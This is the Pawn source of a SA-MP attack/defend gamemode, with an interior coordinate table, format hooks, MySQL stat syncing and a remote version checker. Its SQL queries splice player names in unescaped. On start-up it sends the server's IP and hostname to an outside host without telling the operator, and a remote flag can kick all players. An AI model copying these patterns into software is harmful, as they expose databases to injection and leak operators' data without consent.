{14,  204.1658,   -165.7678,  1000.5234,     181.7583,    "Didier Sachs"},
{12,  1133.35,    -7.8462,    1000.6797,     165.8482,    "Casino (Redsands West)"},
{14,  -1420.4277, 1616.9221,  1052.5313,     159.1255,    "Kickstart Stadium"},
{17,  488.4389,   -11.4271,   1000.6797,     130.6844,    "Club"},
{18,  1727.2853,  -1642.9451, 20.2254,       172.4193,    "Atrium"},
{16,  -202.842,   -24.0325,   1002.2734,     252.8154,    "Los Santos Tattoo Parlor"},
{5,   2233.6919,  -1112.8107, 1050.8828,     8.6483,      "Safe House group 1"},
{6,   1211.2484,  1049.0234,  1050.9410,     170.9341,    "Safe House group 2"},
{9,   2319.1272,  -1023.9562, 1050.2109,     167.3959,    "Safe House group 3"},
{10,  2261.0977,  -1137.8833, 1050.6328,     266.88,      "Safe House group 4"},
{17,  -944.2402,  1886.1536,  5.0051,        179.8548,    "Sherman Dam"},
{16,  -24.6959,   -130.3763,  1003.5469,     178.9616,    "24/7 (version 4)"},
{15,  2217.281,   -1150.5349, 1025.7969,     273.7328,    "Jefferson Motel"},
{1,   1.5491,     23.3183,    1199.5938,     359.9054,    "Jet Interior"},
{1,   681.6216,   -451.8933,  -25.6172,      166.166,     "The Welcome Pump"},
{3,   234.6087,   1187.8195,  1080.2578,     349.4844,    "Burglary House X1"},
{2,   225.5707,   1240.0643,  1082.1406,     96.2852,     "Burglary House X2"},
{1,   224.288,    1289.1907,  1082.1406,     359.868,     "Burglary House X3"},
{5,   239.2819,   1114.1991,  1080.9922,     270.2654,    "Burglary House X4"},
{15,  207.5219,   -109.7448,  1005.1328,     358.62,      "Binco"},
{15,  295.1391,   1473.3719,  1080.2578,     352.9526,    "4 Burglary houses"},
{15,  -1417.8927, 932.4482,   1041.5313,     0.7013,      "Blood Bowl Stadium"},
{12,  446.3247,   509.9662,   1001.4195,     330.5671,    "Budget Inn Motel Room"},
{0,   2306.3826,  -15.2365,   26.7496,       274.49,      "Palamino Bank"},
{0,   2331.8984,  6.7816,     26.5032,       100.2357,    "Palamino Diner"},
{0,   663.0588,   -573.6274,  16.3359,       264.9829,    "Dillimore Gas Station"},
{18,  -227.5703,  1401.5544,  27.7656,       269.2978,    "Lil' Probe Inn"},
{0,   -688.1496,  942.0826,   13.6328,       177.6574,    "Torreno's Ranch"},
{0,   -1916.1268, 714.8617,   46.5625,       152.2839,    "Zombotech - lobby area"},
{0,   818.7714,   -1102.8689, 25.794,        91.1439,     "Crypt in LS cemetery (temple)"},
{0,   255.2083,   -59.6753,   1.5703,        1.4645,      "Blueberry Liquor Store"},
{2,   446.626,    1397.738,   1084.3047,     343.9647,    "Pair of Burglary Houses"},
{5,   227.3922,   1114.6572,  1080.9985,     267.459,     "Crack Den"},
{5,   227.7559,   1114.3844,  1080.9922,     266.2624,    "Burglary House X11"},
{4,   261.1165,   1287.2197,  1080.2578,     178.9149,    "Burglary House X12"},
{4,   291.7626,   -80.1306,   1001.5156,     290.2195,    "Ammu-nation (version 3)"},
{4,   449.0172,   -88.9894,   999.5547,      89.6608,     "Jay's Diner"},
{4,   -27.844,    -26.6737,   1003.5573,     184.3118,    "24/7 (version 5)"},
{0,   2135.2004,  -2276.2815, 20.6719,       318.59,      "Warehouse 3"},
{4,   306.1966,   307.819,    1003.3047,     203.1354,    "Michelle's Love Nest*"},
{10,  24.3769,    1341.1829,  1084.375,      8.3305,      "Burglary House X14"},
{1,   963.0586,   2159.7563,  1011.0303,     175.313,     "Sindacco Abatoir"},
{0,   2548.4807,  2823.7429,  10.8203,       270.6003,    "K.A.C.C. Military Fuels Depot"},
{0,   215.1515,   1874.0579,  13.1406,       177.5538,    "Area 69"},
{4,   221.6766,   1142.4962,  1082.6094,     184.9618,    "Burglary House X13"},
{12,  2323.7063,  -1147.6509, 1050.7101,     206.5352,    "Unused Safe House"},
{6,   344.9984,   307.1824,   999.1557,      193.643,     "Millie's Bedroom"},
{12,  411.9707,   -51.9217,   1001.8984,     173.3449,    "Barber Shop"},
{4,   -1421.5618, -663.8262,  1059.5569,     170.9341,    "Dirtbike Stadium"},
{6,   773.8887,   -47.7698,   1000.5859,     10.7161,     "Cobra Gym"},
{6,   246.6695,   65.8039,    1003.6406,     7.9562,      "Los Santos Police Department"},
{14,  -1864.9434, 55.7325,    1055.5276,     85.8541,     "Los Santos Airport"},
{4,   -262.1759,  1456.6158,  1084.3672,     82.459,      "Burglary House X15"},
{5,   22.861,     1404.9165,  1084.4297,     349.6158,    "Burglary House X16"},
{5,   140.3679,   1367.8837,  1083.8621,     349.2372,    "Burglary House X17"},
{3,   1494.8589,  1306.48,    1093.2953,     196.065,     "Bike School"},
{14,  -1813.213,  -58.012,    1058.9641,     335.3199,    "Francis International Airport"},
{16,  -1401.067,  1265.3706,  1039.8672,     178.6483,    "Vice Stadium"},
{6,   234.2826,   1065.229,   1084.2101,     4.3864,      "Burglary House X18"},
{6,   -68.5145,   1353.8485,  1080.2109,     3.5742,      "Burglary House X19"},
{6,   -2240.1028, 136.973,    1035.4141,     269.0954,    "Zero's RC Shop"},
{6,   297.144,    -109.8702,  1001.5156,     20.2254,     "Ammu-nation (version 4)"},
{6,   316.5025,   -167.6272,  999.5938,      10.3031,     "Ammu-nation (version 5)"},
{15,  -285.2511,  1471.197,   1084.375,      85.6547,     "Burglary House X20"},
{6,   -26.8339,   -55.5846,   1003.5469,     3.9528,      "24/7 (version 6)"},
{6,   442.1295,   -52.4782,   999.7167,      177.9394,    "Secret Valley Diner"},
{2,   2182.2017,  1628.5848,  1043.8723,     224.8601,    "Rosenberg's Office in Caligulas"},
{6,   748.4623,   1438.2378,  1102.9531,     0.6069,      "Fanny Batter's Whore House"},
{8,   2807.3604,  -1171.7048, 1025.5703,     193.7117,    "Colonel Furhberger's"},
{9,   366.0002,   -9.4338,    1001.8516,     160.528,     "Cluckin' Bell"},
{1,   2216.1282,  -1076.3052, 1050.4844,     86.428,      "The Camel's Toe Safehouse"},
{1,   2268.5156,  1647.7682,  1084.2344,     99.7331,     "Caligula's Roof"},
{2,   2236.6997,  -1078.9478, 1049.0234,     2.5706,      "Old Venturas Strip Casino"},
{3,   -2031.1196, -115.8287,  1035.1719,     190.1877,    "Driving School"},
{8,   2365.1089,  -1133.0795, 1050.875,      177.3947,    "Verdant Bluffs Safehouse"},
{0,   1168.512,   1360.1145,  10.9293,       196.5933,    "Bike School"},
{9,   315.4544,   976.5972,   1960.8511,     359.6368,    "Andromada"},
{10,  1893.0731,  1017.8958,  31.8828,       86.1044,     "Four Dragons' Janitor's Office"},
{11,  501.9578,   -70.5648,   998.7578,      171.5706,    "Bar"},
{8,   -42.5267,   1408.23,    1084.4297,     172.068,     "Burglary House X21"},
{11,  2283.3118,  1139.307,   1050.8984,     19.7032,     "Willowfield Safehouse"},
{9,   84.9244,    1324.2983,  1083.8594,     159.5582,    "Burglary House X22"},
{9,   260.7421,   1238.2261,  1084.2578,     84.3084,     "Burglary House X23"},
{0,   -1658.1656, 1215.0002,  7.25,          103.9074,    "Otto's Autos"},
{0,   -1961.6281, 295.2378,   35.4688,       264.4891,    "Wang Cars"},
{11,  2003.1178,  1015.1948,  33.008,        351.5789,    "Four Dragons' Managerial Suite"},
{0,   1087.5002,  2092.8938,  15.3504,		  92.5994,     "Mafia Chip Making Factory"}
};


// Includes that need global variables to be declared first
#include <gBugFix>
//#include <freecam>

//==========================
/*	Linking function to make a new string that would
	reformat string by replacing COL_PRIM by selected
	color layout
*/
//#define formatz(%1,%2,%3) format(%1,%2,%3),format_fix_color(%1)
//======================================================
/* Changes Occurance of COL_PRIM to value contained in ColScheme */
/* Dont change value of COL_PRIM define */
stock format_fix_color(string[])
{
	new l = 0 , len = 0;
	loop_again:
	l = strfind(string,COL_PRIM,true,l+len);
	if( l != -1 )
	{
	    //printf("%s string // %d // %d", string, l, len );
		len = strlen(COL_PRIM);
		strdel(string,l,l+len);
		strins(string,ColScheme,l, strlen(string) + 10);
		goto loop_again;
	}
	else return 1;
    return 0;
}
// did made this code snippet from editing of Ryder`'s SendFormatMessage!
stock _reformat(string[], const iLen, const szFormat[], { Float, _ }: ...) {
    new
        iArgs = (numargs() - 3) << 2
    ;
    //printf("string: %s // len : %d, %s", string, iLen, szFormat );
    if(iArgs) {
        static
            s_iAddr1,
            s_iAddr2
        ;
        #emit ADDR.PRI szFormat
        #emit STOR.PRI s_iAddr1

        for(s_iAddr2 = s_iAddr1 + iArgs, iArgs += 12; s_iAddr2 != s_iAddr1; s_iAddr2 -= 4) {
            #emit LOAD.PRI s_iAddr2
            #emit LOAD.I
            #emit PUSH.PRI
        }
		//load into primary register
		#emit LOAD.S.PRI string

		//push arguments in order 3 , 2 , 1 respectively
        #emit PUSH.S szFormat // 3
        #emit PUSH.S iLen // 2
        #emit PUSH.PRI  //1 . push information from primary register into stack >.>
        #emit PUSH.S iArgs // number of args
        #emit SYSREQ.C format
		// called ^ native function in format: format( string, ilen,szformat )
        #emit LCTRL 4
        #emit LOAD.S.ALT iArgs
        #emit ADD.C 4
        #emit ADD
        #emit SCTRL 4

        //strcat(string,s_szBuf,iLen);
		//printf("INSIDE reformat1 : %s",string);
		format_fix_color(string);
		//printf("INSIDE reformat2 : %s",string);
        return 1;
    }
    else
    {
        format(string,iLen,szFormat);
    }
    return 0;
}

#if defined _ALS_format
    #undef format
#else
    #define _ALS_format
#endif
// Reroute future calls to our function.
#define format _reformat

//======================================================
stock fixColor_SendClientMessage(playerid,color,mess[])
{
    format_fix_color(mess);
	SendClientMessage(playerid,color,mess);
	return 1;
}
#if defined _ALS_SendClientMessage
    #undef SendClientMessage
#else
    #define _ALS_SendClientMessage
#endif
// Reroute future calls to our function.
#define SendClientMessage fixColor_SendClientMessage

//======================================================
stock fixColor_SendClientMessageToAll(color,mess[])
{
    format_fix_color(mess);
	SendClientMessageToAll(color,mess);
	return 1;
}
#if defined _ALS_SendClientMessageToAll
    #undef SendClientMessageToAll
#else
    #define _ALS_SendClientMessageToAll
#endif
// Reroute future calls to our function.
#define SendClientMessageToAll fixColor_SendClientMessageToAll


//===========================


//------------------------------------------------------------------------------
main(){} //---------------------------------------------------------------------
//------------------------------------------------------------------------------

// match sync <start>
#if MATCH_SYNC == 1

#include <a_mysql>

new
	MATCHSYNC_Kills[MAX_PLAYERS],
	MATCHSYNC_Damage[MAX_PLAYERS],
	MATCHSYNC_Accuracy[MAX_PLAYERS],
	MATCHSYNC_Rounds[MAX_PLAYERS];

stock MATCHSYNC_Init()
{
	mysql_close();
	mysql_debug(1);
 	mysql_connect("", "", "", "");
	return 1;
}

stock MATCHSYNC_DoesNameExist(nametocheck[])
{
	new query[70],result[128];
	format(query, sizeof(query), "SELECT SQLid FROM Players WHERE Name='%s'", nametocheck);
	mysql_query(query);
	mysql_store_result();
	if(mysql_fetch_row(result))
	{
	    mysql_free_result();
	    return 1;
 	}
 	else
 	{
 	    mysql_free_result();
  	}
	return 0;
}

stock MATCHSYNC_SyncPlayerKills(playerid)
{
    new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof name);
	new query[70],result[128];
	format(query, sizeof(query), "SELECT Kills FROM Players WHERE Name='%s'", name);
	mysql_query(query);
	mysql_store_result();
	if(mysql_fetch_row(result))
	{
	    MATCHSYNC_Kills[playerid] = strval(result);
 	}
 	mysql_free_result();
	return 1;
}

stock MATCHSYNC_SyncPlayerDamage(playerid)
{
    new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof name);
	new query[70],result[128];
	format(query, sizeof(query), "SELECT Damage FROM Players WHERE Name='%s'", name);
	mysql_query(query);
	mysql_store_result();
	if(mysql_fetch_row(result))
	{
	    MATCHSYNC_Damage[playerid] = strval(result);
 	}
 	mysql_free_result();
	return 1;
}

stock MATCHSYNC_SyncPlayerAccuracy(playerid)
{
    new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof name);
	new query[70],result[128];
	format(query, sizeof(query), "SELECT Accuracy FROM Players WHERE Name='%s'", name);
	mysql_query(query);
	mysql_store_result();
	if(mysql_fetch_row(result))
	{
	    MATCHSYNC_Accuracy[playerid] = strval(result);
 	}
 	mysql_free_result();
	return 1;
}

stock MATCHSYNC_SyncPlayerRounds(playerid)
{
    new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof name);
	new query[70],result[128];
	format(query, sizeof(query), "SELECT Rounds FROM Players WHERE Name='%s'", name);
	mysql_query(query);
	mysql_store_result();
	if(mysql_fetch_row(result))
	{
	    MATCHSYNC_Rounds[playerid] = strval(result);
 	}
 	mysql_free_result();
	return 1;
}

stock MATCHSYNC_SyncAllPlayers()
{
    foreach(new i : Player)
    {
        new name[MAX_PLAYER_NAME];
        GetPlayerName(i, name, sizeof name);
        if(strfind(name, "[KHK]", true, 0) != -1 || strfind(name, "[KHKr]", true, 0) != -1 || strfind(name, "[KHKa]", true, 0) != -1)
        {
            MATCHSYNC_SyncPlayerKills(i);
            MATCHSYNC_SyncPlayerDamage(i);
            MATCHSYNC_SyncPlayerAccuracy(i);
            MATCHSYNC_SyncPlayerRounds(i);
        }
    }
	return 1;
}

stock MATCHSYNC_InsertPlayer(playerid)
{
	new query[256];
	new _name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, _name, sizeof(_name));
	format(query, sizeof(query), "INSERT INTO Players (Name, Damage, Kills, Accuracy, Rounds) VALUES ('%s', %d, %d, %d, %d)", _name, floatround(Player[playerid][TotalDamage]), Player[playerid][TotalKills], floatround(Player[playerid][TotalAccuracy]), Player[playerid][RoundPlayed]);
	mysql_query(query);
}

stock MATCHSYNC_UpdatePlayer(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof name);
	new query[256];
	format(query, sizeof(query), "UPDATE Players SET Damage=%d, Kills=%d, Accuracy=%d, Rounds=%d WHERE Name='%s'", MATCHSYNC_Damage[playerid], MATCHSYNC_Kills[playerid], MATCHSYNC_Accuracy[playerid], MATCHSYNC_Rounds[playerid], name);
	mysql_query(query);
	return 1;
}

#define WHEN_ROUND_END 0
#define WHEN_MATCH_END 1

stock MATCHSYNC_UpdateAllPlayers(when)
{
	if(WarMode == true)
	{
	    if((strlen(TeamName[ATTACKER]) <= 3 && !strcmp(TeamName[ATTACKER], "KHK", true, 3)) || (strlen(TeamName[DEFENDER]) <= 3 && !strcmp(TeamName[DEFENDER], "KHK", true, 3)))
		{
		    SendClientMessageToAll(-1, ""COL_PRIM"Match-sync: {FFFFFF}Syncing all players data before updating!");
			MATCHSYNC_SyncAllPlayers();
			SendClientMessageToAll(-1, ""COL_PRIM"Match-sync: {FFFFFF}Updating all players data...");
		    foreach(new i : Player)
		    {
		        new name[MAX_PLAYER_NAME];
		        GetPlayerName(i, name, sizeof name);
		        if(strfind(name, "[KHK]", true, 0) != -1 || strfind(name, "[KHKr]", true, 0) != -1 || strfind(name, "[KHKa]", true, 0) != -1)
		        {
		            if(MATCHSYNC_DoesNameExist(name) == 0)
	 					MATCHSYNC_InsertPlayer(i);
					else
					{
					    switch(when)
					    {
					        case WHEN_MATCH_END:
					        {
					            if(Player[i][RoundKills] == 0 && floatround(Player[i][RoundDamage]) == 0 && floatround(Player[i][Accuracy]) == 0)
									goto skipped;
								MATCHSYNC_Kills[i] += Player[i][TotalKills];
								MATCHSYNC_Damage[i] += floatround(Player[i][TotalDamage]);
								MATCHSYNC_Accuracy[i] += floatround(Player[i][TotalAccuracy]); // null
								MATCHSYNC_Rounds[i] += Player[i][RoundPlayed];
							}
							case WHEN_ROUND_END:
							{
							    if(Player[i][RoundKills] == 0 && floatround(Player[i][RoundDamage]) == 0 && floatround(Player[i][Accuracy]) == 0)
									goto skipped;
							    MATCHSYNC_Kills[i] += Player[i][RoundKills];
								MATCHSYNC_Damage[i] += floatround(Player[i][RoundDamage]);
								MATCHSYNC_Accuracy[i] += floatround(Player[i][Accuracy]);
								MATCHSYNC_Rounds[i] ++;
							}
						}
						MATCHSYNC_UpdatePlayer(i);
						skipped:
					}
		        }
		    }
		    SendClientMessageToAll(-1, ""COL_PRIM"Match-sync: {FFFFFF}Synced and updated all players data successfully!");
		}
	}
	return 1;
}

stock MATCHSYNC_InsertMatchStats()
{
    SendClientMessageToAll(-1, ""COL_PRIM"Match-sync: {FFFFFF}Uploading match stats to the MySQL database!");
	new winnerName[16], loserName[16], score[16];
	if(TeamScore[ATTACKER] > TeamScore[DEFENDER])
	{
	    format(winnerName, sizeof winnerName, "%s", TeamName[ATTACKER]);
	    format(loserName, sizeof loserName, "%s", TeamName[DEFENDER]);
	    format(score, sizeof score, "%d:%d", TeamScore[ATTACKER], TeamScore[DEFENDER]);
	}
	else if(TeamScore[DEFENDER] > TeamScore[ATTACKER])
	{
	    format(winnerName, sizeof winnerName, "%s", TeamName[DEFENDER]);
	    format(loserName, sizeof loserName, "%s", TeamName[ATTACKER]);
	    format(score, sizeof score, "%d:%d", TeamScore[DEFENDER], TeamScore[ATTACKER]);
	}
	else
	{
	    format(winnerName, sizeof winnerName, "%s", TeamName[ATTACKER]);
	    format(loserName, sizeof loserName, "%s", TeamName[DEFENDER]);
	    format(score, sizeof score, "%d:%d", TeamScore[ATTACKER], TeamScore[DEFENDER]);
	}
	new date[64];
    new Year, Month, Day;
	getdate(Year, Month, Day);
	new Hours, Minutes, Seconds;
	gettime(Hours, Minutes, Seconds);
	format(date, sizeof date, "[%02d/%02d/%d]:[%02d:%02d:%02d]", Day, Month, Year, Hours, Minutes, Seconds);
	new alAC[16];

	#if ANTICHEAT == 1
	if(AntiCheat == true)
		format(alAC, sizeof alAC, "Was On");
	else
		format(alAC, sizeof alAC, "Was Off");
	#else
 	format(alAC, sizeof alAC, "Was Off");
	#endif

	new query[300];
	format(query, sizeof(query), "INSERT INTO Matches (TeamA, TeamB, Score, DateTime, AC) VALUES ('%s', '%s', '%s', '%s', '%s')", winnerName, loserName, score, date, alAC);
	mysql_query(query);
	SendClientMessageToAll(-1, ""COL_PRIM"Match-sync: {FFFFFF}Match stats has been uploaded successfully!");
}

#endif
// match sync <end>

// version checker <start>
#define VERSION_CHAR_LENGTH     		4

#define VERSION_CHECKER_VERSION_URL		"sixtytiger.com/khalid/AttDef_API/VersionChecker/version.php"
#define VERSION_CHECKER_FORCEUSER_URL	"sixtytiger.com/khalid/AttDef_API/VersionChecker/forceuser.php"
#define VERSION_CHECKER_CHANGELOG_URL	"INVALID SHIT"

#define VERSION_IS_BEHIND       		0
#define VERSION_IS_UPTODATE     		1

#define VERSION_CHECKER_METHOD          0 // (1 for new method which is good when updates are more frequent - 0 for old method)

#if VERSION_CHECKER_METHOD == 0
new 	GM_VERSION[6] =		"2.6.0"; // Don't forget to change the length
#endif

new VersionReport = -1;
new bool:VersionCheckerStatus = false, bool:ForceUserToNewestVersion = false;
new LatestVersionStr[64], LatestVersionChangesStr[512];
new VC_ConnectionFailures = 0;

stock InitVersionChecker(timer = true, moreinfo = false)
{
	if(timer)
	{
		SetTimer("ReportServerVersion", 1 * 60 * 60 * 1000, true);
	}
	if(moreinfo)
	{
	    HTTP(1, HTTP_GET, VERSION_CHECKER_FORCEUSER_URL, "", "ForceUserToUseNewest");
	}
	HTTP(0, HTTP_GET, VERSION_CHECKER_VERSION_URL, "", "SaveVersionInStr");
	return 1;
}

forward ReportServerVersion_Delayed();
public ReportServerVersion_Delayed()
{
    if(!VersionCheckerStatus)
    {
        if(VC_ConnectionFailures < 6)
        {
            SetTimer("ReportServerVersion_Delayed", 2000, false);
        }
	    return 0;
	}
	    
    if(VersionReport == VERSION_IS_BEHIND)
 	{
     	SendClientMessageToAll(-1, ""COL_PRIM"Version checker: {FFFFFF}the version used in this server is out-dated. You can visit "COL_PRIM"www.sixtytiger.com {FFFFFF}to get the latest version");
        #if VERSION_CHECKER_METHOD == 0
		SendClientMessageToAll(-1, sprintf(""COL_PRIM"Server version: {FFFFFF}%s "COL_PRIM"| Newest version: {FFFFFF}%s", GM_VERSION, LatestVersionStr));
		#endif
		#if VERSION_CHECKER_METHOD == 1
        SendClientMessageToAll(-1, sprintf(""COL_PRIM"Server version: {FFFFFF}%s "COL_PRIM"| Newest version: {FFFFFF}%s", GM_NAME, LatestVersionStr));
		#endif
		if(ForceUserToNewestVersion)
		{
		    foreach(new i : Player)
		    {
		        VersionOutdatedKick(i);
		    }
		}
	}
	/*else
 	{
     	SendClientMessageToAll(-1, sprintf(""COL_PRIM"Server version: {FFFFFF}%s "COL_PRIM"| Newest version: {FFFFFF}%s", GM_VERSION, LatestVersionStr));
	}*/
	return 1;
}

forward ReportServerVersion();
public ReportServerVersion()
{
	if(!VersionCheckerStatus)
	    return 0;

    HTTP(0, HTTP_GET, VERSION_CHECKER_VERSION_URL, "", "SaveVersionInStr");
    HTTP(1, HTTP_GET, VERSION_CHECKER_FORCEUSER_URL, "", "ForceUserToUseNewest");
    SetTimer("ReportServerVersion_Delayed", 2000, false);
	return 1;
}

forward ForceUserToUseNewest(index, response_code, data[]);
public ForceUserToUseNewest(index, response_code, data[])
{
    if(response_code == 200)
    {
		new value = strval(data);
		if(value == 0)
		{
		    ForceUserToNewestVersion = false;
		}
		else if(value == 1)
		{
		    ForceUserToNewestVersion = true;
		}
    }
    else
    {
        if(VC_ConnectionFailures < 6)
        {
	        ForceUserToNewestVersion = false;
	        HTTP(1, HTTP_GET, VERSION_CHECKER_FORCEUSER_URL, "", "ForceUserToUseNewest");
	        VC_ConnectionFailures ++;
	 	}
	}
	return 1;
}

forward SaveVersionInStr(index, response_code, data[]);
public SaveVersionInStr(index, response_code, data[])
{
    if(response_code == 200)
    {
		format(LatestVersionStr, sizeof LatestVersionStr, "%s", data);
		VersionCheckerStatus = true;
		VersionReport = ReportVersion();
		//HTTP(0, HTTP_GET, VERSION_CHECKER_CHANGELOG_URL, "", "SaveChangelogInStr");
    }
    else
    {
        if(VC_ConnectionFailures < 6)
        {
	        VersionCheckerStatus = false;
	        HTTP(0, HTTP_GET, VERSION_CHECKER_VERSION_URL, "", "SaveVersionInStr");
	        VC_ConnectionFailures ++;
		}
	}
	return 1;
}

forward SaveChangelogInStr(index, response_code, data[]);
public SaveChangelogInStr(index, response_code, data[])
{
    if(response_code == 200)
    {
		format(LatestVersionChangesStr, sizeof LatestVersionChangesStr, "%s", data);
    }
    else
        VersionCheckerStatus = false;
    return 1;
}

stock ReportVersion()
{
	if(!VersionCheckerStatus)
		return -1;

	#if VERSION_CHECKER_METHOD == 0
	// spliting the version str on the website
	new first[VERSION_CHAR_LENGTH], second[VERSION_CHAR_LENGTH], third[VERSION_CHAR_LENGTH];
	format(first, sizeof first, "");
	format(second, sizeof second, "");
	format(third, sizeof third, "");
	new pos = 0;
	for(new i = 0; i < strlen(LatestVersionStr) + 2; i ++)
	{
	    if(LatestVersionStr[i] == '.')
	    {
			pos ++;
			continue;
		}
        if(!strlen(LatestVersionStr[i]))
		    break;

		switch(pos)
		{
		    case 0:
		    {format(first, sizeof first, "%s%c", first, LatestVersionStr[i]);}
		    case 1:
		    {format(second, sizeof second, "%s%c", second, LatestVersionStr[i]);}
		    case 2:
		    {format(third, sizeof third, "%s%c", third, LatestVersionStr[i]);}
		}
	}
	// spliting the version str on the server
	new svfirst[VERSION_CHAR_LENGTH], svsecond[VERSION_CHAR_LENGTH], svthird[VERSION_CHAR_LENGTH];
	format(svfirst, sizeof svfirst, "");
	format(svsecond, sizeof svsecond, "");
	format(svthird, sizeof svthird, "");
	pos = 0;
	for(new i = 0; i < strlen(GM_VERSION) + 2; i ++)
	{
	    if(GM_VERSION[i] == '.')
	    {
			pos ++;
			continue;
		}
		if(!strlen(GM_VERSION[i]))
		    break;

		switch(pos)
		{
		    case 0:
		    {format(svfirst, sizeof svfirst, "%s%c", svfirst, GM_VERSION[i]);}
		    case 1:
		    {format(svsecond, sizeof svsecond, "%s%c", svsecond, GM_VERSION[i]);}
		    case 2:
		    {format(svthird, sizeof svthird, "%s%c", svthird, GM_VERSION[i]);}
		}
	}
	// comparing them

	if(strval(first) > strval(svfirst))
 	{
 	    return VERSION_IS_BEHIND;
	}

    if(strval(first) == strval(svfirst))
    {
		if(strval(second) > strval(svsecond))
     	{
     	    return VERSION_IS_BEHIND;
		}
	}

    if(strval(first) == strval(svfirst))
    {
    	if(strval(second) == strval(svsecond))
    	{
    	    if(strval(third) > strval(svthird))
        	{
        	    return VERSION_IS_BEHIND;
			}
		}
	}
	#endif
	#if VERSION_CHECKER_METHOD == 1
	if(strcmp(GM_NAME, LatestVersionStr, true) != 0)
	{
		return VERSION_IS_BEHIND;
	}
	#endif

	return VERSION_IS_UPTODATE;
}

CMD:checkversion(playerid, params[])
{
	if(!VersionCheckerStatus)
	    return SendErrorMessage(playerid, "Connection error. Try again later maybe!");
	    
    #if VERSION_CHECKER_METHOD == 1
	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Version Checker",
	 sprintf(""COL_PRIM"Server version: {FFFFFF}%s "COL_PRIM"| Newest version: {FFFFFF}%s", GM_NAME, LatestVersionStr), "Okay", "");
	#endif
	#if VERSION_CHECKER_METHOD == 0
	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Version Checker",
	 sprintf(""COL_PRIM"Server version: {FFFFFF}%s "COL_PRIM"| Newest version: {FFFFFF}%s", GM_VERSION, LatestVersionStr), "Okay", "");
	#endif
	return 1;
}
// version checker <end>


forward DelayedDatabaseStuff();
public DelayedDatabaseStuff()
{
    	// Get info about our columns in the Players table
	new DBResult:res = db_query(sqliteconnection, "PRAGMA table_info(Players)");

	new bool:found = false;
	// Loop to check and see if our IP column already exists
	do {
	    new column[50];
	    db_get_field_assoc(res, "name", column, sizeof(column));
	    if(!strcmp(column, "IP", true) && strlen(column) > 0) {
	        // It does exist, so exit loop.
	        found = true;
	        break;
	    }
	} while(db_next_row(res));

	db_free_result(res);

	// If column wasn't found, add it to our db
	if(!found) {
	    db_free_result(db_query(sqliteconnection, "ALTER TABLE `Players` ADD COLUMN IP CHAR(" #MAX_PLAYER_NAME ") NOT NULL DEFAULT 0"));
	}

	// Vacuum SQL database
	db_free_result(db_query(sqliteconnection, "VACUUM"));

	LoadConfig();

	LoadTextDraws(); // Loads all gloable textdraws

	LoadBases(); // Loads bases
	LoadArenas(); // Loads areans
	LoadDMs(); // Loads DMs
    CreateDuelArena();

    //AddFoxGlitchFix(); // Fixes BASE 42 glitch
    
	db_free_result(db_query(sqliteconnection, "ALTER TABLE `Players` ADD HitSound INTEGER(128) NOT NULL DEFAULT 17802"));
	db_free_result(db_query(sqliteconnection, "ALTER TABLE `Players` ADD GetHitSound INTEGER(128) NOT NULL DEFAULT 1131"));
	
	new iString[128];
	format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
	TextDrawSetString(RoundsPlayed, iString);

	format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
    TextDrawSetString(TeamScoreText, iString);

	for(new i = 0; i < MAX_BASES; i++) RecentBase[i] = -1;
	for(new i = 0; i < MAX_ARENAS; i++) RecentArena[i] = -1;
	DatabaseLoading = false;
    return 1;
}

forward DatabaseDefaultReload();
public DatabaseDefaultReload()
{
    SetDatabaseToReload();
    SetTimer("DelayedDatabaseStuff", 200, false);
	return 1;
}

public OnGameModeInit()
{
	UsePlayerPedAnims(); // Player movement
	AllowInteriorWeapons(1); // Allow weapons in interiors
	DisableInteriorEnterExits(); // Disables entering interiors (e.g. Burger shots)
	EnableStuntBonusForAll(0); // If you stunt you won't get any points (Value = 0)
	SetNameTagDrawDistance(DRAW_DISTANCE); // Distance to see other players name and Hp
	EnableVehicleFriendlyFire(); //
	SetGravity(0.008); // Gravity
	GameType = BASE;

    ServerLastPlayed = -1;
    ServerLastPlayedType = -1;
    Current = -1;
	SetGameModeText(GM_NAME); // Text that appears on 'Mode' column when you click on a server in samp.exe
    SendRconCommand("mapname Lobby");

    new ServerIP[30];
    GetServerVarAsString("hostname", hostname, sizeof(hostname));
    GetServerVarAsString("bind", ServerIP, sizeof(ServerIP));

    lagcompmode = GetServerVarAsInt("lagcompmode");

	GetServerVarAsString("hostname", hostname, sizeof(hostname));

    new port = GetServerVarAsInt("port");

    if(!strlen(ServerIP)) ServerIP = "noip";

    new post[256];
    format(post, sizeof(post), "IP=%s&Port=%d&HostName=%s", ServerIP, port, hostname);
    HTTP(100, HTTP_POST, "gator3016.hostgator.com/~maarij94/attdef-api/serverlist.php", post, "");
    
	ZMax[0] = -1;
	ZMax[1] = -1;
	ZMin[0] = -1;
	ZMin[1] = -1;


    printf("Hostname: %s", hostname);

	SendRconCommand("stream_distance 400.0");
	SendRconCommand("stream_rate 50");

	#if MATCH_SYNC == 1
    MATCHSYNC_Init();
	#endif

    //db_close(sqliteconnection);
	sqliteconnection = db_open("AAD.db");
	DatabaseLoading = true;
	SetTimer("DatabaseDefaultReload", 100, false);

    format(MAIN_TEXT_COLOUR, sizeof MAIN_TEXT_COLOUR, "~l~");
    MAIN_BACKGROUND_COLOUR = 0xEEEEEE33;

	AddPlayerClass(Skin[ATTACKER], 0, 0, 0, 0, 0, 0, 0, 0, 0, 0); // attacker

	SetWorldTime(MainTime); // Sets server time
	SetWeather(MainWeather); // Sets server weather

	#if ANTICHEAT == 1
	AC_Toggle(false);
	PermAC = false;
	#endif


	TextColor[ATTACKER] 	= 	"{FF0033}";
	TextColor[ATTACKER_SUB] = 	"{FFAAAA}";
